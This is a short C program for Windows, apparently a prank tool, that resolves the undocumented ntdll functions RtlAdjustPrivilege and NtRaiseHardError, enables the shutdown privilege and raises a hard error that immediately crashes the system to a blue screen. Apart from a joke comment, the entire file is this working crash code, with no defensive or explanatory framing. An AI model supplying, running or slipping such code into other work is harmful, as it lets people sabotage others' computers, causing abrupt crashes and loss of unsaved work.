#include <windows.h>

int main() {
	HMODULE ntdll = LoadLibraryA("ntdll.dll");
	BOOLEAN bEnabled;
	ULONG uResp;
	NTSTATUS(NTAPI *RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN) = (NTSTATUS(NTAPI *)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN))GetProcAddress(ntdll, "RtlAdjustPrivilege");
	NTSTATUS(NTAPI *NtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG) = (NTSTATUS(NTAPI *)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG))GetProcAddress(ntdll, "NtRaiseHardError");
	NTSTATUS NtRet = RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
	// Darude: Sandstorm
	NtRaiseHardError(STATUS_ACCESS_VIOLATION, 0, 0, 0, 6, &uResp);
	FreeLibrary(ntdll);
	return 0;
}
